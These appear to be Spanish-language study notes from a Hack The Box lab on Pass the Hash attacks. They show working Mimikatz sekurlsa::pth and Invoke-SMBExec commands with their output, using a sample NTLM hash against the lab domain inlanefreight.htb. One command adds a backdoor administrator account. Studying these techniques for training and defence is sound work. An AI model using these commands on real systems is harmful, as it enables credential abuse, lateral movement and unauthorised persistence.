
Un ataque de **Pass the Hash (PtH)** es una técnica en la que un atacante utiliza el **hash de una contraseña** en lugar de la contraseña en texto plano para autenticarse.  
El atacante **no necesita descifrar el hash** para obtener la contraseña original.  
Los ataques PtH explotan el protocolo de autenticación, ya que el hash de la contraseña **permanece constante** en cada sesión hasta que se cambie la contraseña.

Como se explicó en secciones anteriores, el atacante debe tener **privilegios administrativos** o privilegios específicos en la máquina objetivo para poder obtener el hash de la contraseña.  
Los **hashes** pueden obtenerse de varias maneras, incluyendo:

- Volcado de la base de datos **SAM** local desde un equipo comprometido.
- Extracción de hashes desde la base de datos **NTDS (ntds.dit)** en un **Controlador de Dominio**.
- Obtención de los hashes directamente desde la **memoria (proceso lsass.exe)**.

Supongamos que obtenemos el siguiente hash de contraseña **(64F12CDDAA88057E06A81B54E73B949B)** para la cuenta **julio** del dominio **inlanefreight.htb**.  
Veamos cómo podemos realizar ataques Pass the Hash desde máquinas **Windows y Linux**.

### Pass the Hash con Mimikatz (Windows)

La primera herramienta que vamos a usar para hacer este tipo de ataque es [Mimikatz](https://github.com/gentilkiwi). Tiene un módulo llamado `sekurlsa::pth` que nos permite hacer un ataque PtH empezando un proceso usando el hash de la contraseña del usuario. Necesitaremos lo siguiente para el módulo en cuestión:
- `/user`: El usuario que queremos impersonar
- `/rc4` o `/NTLM`: EL hash NTLM de la contraseña del usuario
- `/domain`: El dominio al que pertenece el usuario a impersonar
- `/run`: El programa que queremos correr con el contexto del usuario. Por defecto tira de cmd

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Ahora podríamos usar cmd para ejecutar comandos en el contexto del usuario. En el siguiente ejemplo vemos como el usuario `julio` puede conectarse a un directorio compartido llamado `julio` en el DC (controlador de dominio, $Domain Controller$): 

![[Pasted image 20250423175827.png | 800]]

### Pass the Hash con PowerShell Invoke-TheHash (Windows)

Otra herramienta que podemos usar para realizar ataques **Pass the Hash** en Windows es **Invoke-TheHash**. Esta herramienta es una colección de funciones en PowerShell que permiten llevar a cabo ataques **Pass the Hash** utilizando **WMI** y **SMB**. Las conexiones con **WMI** y **SMB** se realizan mediante el **TCPClient** de .NET. La autenticación se realiza pasando un **hash NTLM** al protocolo de autenticación **NTLMv2**. No se requieren privilegios de administrador local en el cliente, pero el usuario y el hash utilizados para la autenticación deben tener derechos administrativos en el equipo objetivo. En este ejemplo, se utilizarán el usuario **julio** y el hash **64F12CDDAA88057E06A81B54E73B949B**.

Cuando se usa **Invoke-TheHash**, existen dos opciones: **ejecución de comandos SMB** o **ejecución de comandos WMI** . Para usar esta herramienta, tendremos que especificar los siguientes parámetros en la máquina objetivo:
- `Target`: Hostname o IP del objetivo
- `Username`: Usuario para la autenticación
- `Domain`: Dominio para la autenticación. Innecesario con cuentas locales o poniendo `@domain` después del usuario
- `Hash`: Hash NTLM para la autenticación
- `Command`: Comando a ejecutar. Si no está especificado, la función comprobará si el usuario tiene acceso a WMI en el objetivo

##### Invoke-TheHash con SMB

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

También podemos hacer una reverse shell. Consultar [[Shells]].